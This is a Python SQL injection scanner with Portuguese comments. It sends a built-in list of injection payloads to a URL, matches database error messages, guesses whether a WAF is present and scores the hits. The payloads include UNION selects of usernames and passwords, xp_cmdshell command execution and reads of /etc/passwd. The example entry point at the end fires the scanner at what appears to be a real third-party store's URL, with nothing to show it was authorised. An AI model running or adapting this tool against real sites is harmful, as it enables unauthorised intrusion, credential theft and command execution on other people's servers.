import asyncio
import random
import re

import utils
import jsonlog
import commons

# payload -> carga enviada
# response -> resposta bruta da requisicao 
async def sqli_score_system(payload, response):
    score = 5  # Pontuação inicial, pre-validado (max: 20pts)
    dbase_types = ['mysql', 'postgresql', 'sqlserver', 'oracle', 'mongodb', 'sqlite', 'redis', 'db2', 'mariadb', 'cockroachdb']
    suspicious = {
        'response_length': 3 if len(response.text) > 1500 else 2 if len(response.text) < 200 else 0,
        'response_time': 6 if response.elapsed.total_seconds() > 10 else 4 if response.elapsed.total_seconds() > 5 else 0,
        'response_code': 3 if response.status_code == 500 else 2 if response.status_code == 403 else 0,
        'response_header': 3 if "X-Powered-By" in response.headers and any(b in response.headers.get('X-Powered-By', '').lower() for b in dbase_types) else 0,
    }
    score += sum(v for v in suspicious.values())
    return score

# response -> resposta bruta da requisicao
async def sqli_waf_detection(response):
    score = 0
    waf_servers = [
        'cloudflare', 'sucuri', 'akamai', 'imperva', 'incapsula', 'barracuda',
        'f5 big-ip', 'aws', 'amazon cloudfront', 'fastly', 'edgecast', 'stackpath',
        'radware', 'druva', 'nsfocus', 'fortinet', 'fortiweb', 'citrix', 'cdn77',
        'qualys', 'netscaler', 'bluedon', 'dotdefender', 'alert logic', 'trustwave',
        'denyall', 'oracle cloud', 'shield square', 'reblaze', 'akamai ghost',
        'wangsu', 'yundun', 'baidu yunjiasu', 'aliyun', '360 web application firewall',
        'tencent cloud',
    ]
    waf_status_code = [400, 401, 403, 404, 406, 408, 409, 411, 413, 414, 418, 429, 451]
    waf_redirect = ['/error', '/security-check', '/blocked']
    waf_block_phrases = [
        'access denied', 'request blocked', 'forbidden', 'not allowed',
        'waf', 'web application firewall', 'security check', 'malicious request',
        'you have been blocked', 'denied by policy',
    ]
    waf_headers = ['x-sucuri-id', 'cf-ray', 'x-akamai-transformed', 'x-cdn']

    responder_headers = [k.lower() for k in response.headers.keys()]
    
    waf_possibility = {
        'servers': 10 if response.headers.get('server', '').lower() in waf_servers else 0,
        'status_code': 3 if response.status_code in waf_status_code else 0,
        'location': 10 if response.headers.get('location', '').lower() in waf_redirect else 0,
        'block_pharses': 5 if any(pharses.lower() in response.text.lower() for pharses in waf_block_phrases) else 0,
        'headers': 5 if any(term.lower() in responder_headers for term in waf_block_phrases) else 0,
    }
    score += sum(v for v in waf_possibility.values())
    return True if score >= 10 else False


async def sqli(origin, file=None, ua_status=False, headers=None, timeout=10, SSL=True, proxies=None, interval=1, continue_=False, score_sqli=False, try_requests=1):
    # CONSTANTES
    name_save_file = 'sqli_test.json'
    scheme = 'https' if SSL else 'http'

    default_payload = [
        "1 OR 1=1",
        "' OR '1'='1'--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT username, password FROM users--",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' OR 1=1#",
        "' OR 'x'='x",
        "1 AND 1=2",
        "1 UNION ALL SELECT NULL,NULL,NULL--",
        "1' AND SLEEP(5)--",
        "1' AND pg_sleep(5)--",
        "1 WAITFOR DELAY '00:00:05'--",
        "' OR EXISTS(SELECT * FROM users)--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
        "1; EXEC xp_cmdshell('whoami')--",
        "1; SELECT load_file('/etc/passwd')--",
        "' UNION SELECT 1,database(),user()--",
        "admin' AND 1=(SELECT COUNT(*) FROM tablename)--",
        "' AND ASCII(SUBSTRING((SELECT database()),1,1))>77--",
        "' OR updatexml(1,concat(0x7e,(SELECT database())),0)--",
        "' OR extractvalue(1,concat(0x7e,(SELECT user())))--",
        "1;SELECT+PG_SLEEP(5)",
        "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--",
    ]
    
    error_messages = {
        'mysql': [
            r"You have an error in your SQL syntax", r"mysql", r"SQL syntax", 
            r"Query failed", r"database error", r"invalid query", r"incorrect syntax", 
            r"error in your SQL syntax", r"unclosed quotation mark", r"unexpected EOF", 
            r"unexpected token", r"unable to execute", r"invalid input"
        ],
        'postgresql': [
            r"syntax error", r"invalid input syntax for type", r"pg_sleep", 
            r"unrecognized statement", r"failed to open", r"unrecognized variable", 
            r"missing FROM-clause entry", r"division by zero", r"invalid regular expression"
        ],
        'sqlserver': [
            r"Msg \d+", r"Incorrect syntax", r"WAITFOR DELAY", r"incorrect syntax near", 
            r"conversion failed when converting the varchar value", 
            r"cannot insert the value", r"unclosed quotation mark after the character string", 
            r"Invalid object name", r"Arithmetic overflow error"
        ],
        'oracle': [
            r"ORA-\d+:.*", r"SQL command not properly ended", r"missing expression", r"invalid number", 
            r"invalid identifier", r"ORA-00933:.*", r"ORA-01756:.*", r"ORA-00904:.*", 
            r"ORA-01428:.*", r"ORA-01476:.*", r"ORA-12899: value too large for column.*"
        ],
        'mongodb': [
            r"SyntaxError: Unexpected token.*", 
            r"FieldError: Unknown field.*", 
            r"BSONObj size.*", r"MongoError:", r"Cannot apply \$.*", 
            r"Unterminated string in JSON.*"
        ],
        'sqlite': [
            r"SQLite error:.*", r"no such column:.*", r"datatype mismatch", 
            r"UNIQUE constraint failed.*", r"near \"\": syntax error", 
            r"unrecognized token:.*", r"too many SQL variables", 
            r"attempt to write a readonly database"
        ],
        'redis': [
            r"ERR unknown command.*", r"ERR syntax error", r"WRONGTYPE Operation.*", 
            r"OUT OF MEMORY", r"BUSY Redis is busy running a script"
        ],
        'db2': [
            r"SQLCODE=-\d+", r"DB2 SQL Error:.*", r"SQLSTATE=.*", 
            r"SQLCODE: -302", r"SQLERRMC=.*", 
            r"A character that is not valid.*"
        ],
        'mariadb': [
            r"You have an error in your SQL syntax", r"MariaDB server version.*", 
            r"incorrect parameter count in the call to native function.*", 
            r"Query execution failed.*"
        ],
        'cockroachdb': [
            r"unexpected value", r"invalid syntax", r"pq: syntax error", 
            r"relation .* does not exist", r"column .* does not exist"
        ],
    }

    if file == None:
        print(f'[#][{commons.time_now()}] Implementando o uso de payloads padrao')
        payloads = default_payload
    else:
        status_payload, payloads = await commons.fileReader(file)
        if not status_payload:
            print(f'[-][{commons.time_now()}] {payloads}')
            return False, payloads
    
    async def sqli_async(payloads):
        for payload in payloads:
            # VARIAVEIS
            score = 0
            details = {}
            html_sample = ''

            payload = payload.strip()
            url = f'{scheme}://{origin}'.replace('*', payload)

            await asyncio.sleep(interval)

            print(f'[+][{commons.time_now()}] Tentando: {url}')
            status, r = commons.request(url, timeout=timeout, SSL=SSL, headers=headers,
                                        ua_status=ua_status, redirect=False, proxies=proxies, try_requests=try_requests)
            
            if status:
                for k, v in error_messages.items(): # itera sobre o dicionario
                    # if any(error_msg.lower() in r.text.lower() for error_msg in v): 
                    if any(re.search(error_msg.lower(), r.text.lower()) for error_msg in v): # verifica o tipo de erro no retorno
                        details['database_type'] = k

                        if score_sqli:
                            score = await sqli_score_system(payload, r)
                            details['sqli_score'] = score
                        
                        print(f'{" "*3}[>][{commons.time_now()}][{r.status_code}] Possível vulnerabilidade: {url} -> {payload}')
                        print(f'{" "*3}[>] Tipo: {k} Msg: {error_msg} url: {url} Score: {score}')
                        
                        if not continue_:
                            return True, f'[#][{utils.time_now()}][{r.status_code}] Possível vulnerabilidade: {url} -> {payload}'
                
                details['waf'] = await sqli_waf_detection(r) # verifica a chance de ter waf
                html_sample = r.text if r.status_code in [301, 302, 307] else r.text[:500] # recolhe amostra do http
            # retorna em caso de erros na requisicao
            else:
                print(f'{" "*3}[>][{commons.time_now()}] Falha ao requisitar: {r}')
            
            # transforma em json object
            json_obj_response = jsonlog.ObjectJson.from_data(domain=origin, payload=payload, url=url, ip='', r=r, html_sample=html_sample, details=details)
            write = await jsonlog.AsyncLogger(name_save_file).json_write(json_obj_response)

        return True, f'[#] Wordlist concluido: {file} & Gerado arquivo: {name_save_file}'
    
    await sqli_async(payloads) # executa todo o loop e aguarda
            

# Exemplo de uso
async def main():
    try:
        status, attk = await sqli(
            'www.constinta.com.br/v1-index-php-lojas?srsltid=*',
            continue_=True,
            score_sqli=True,
        )
    except TypeError:
        return True, f'[#] Execucao finalizada'

asyncio.run(main())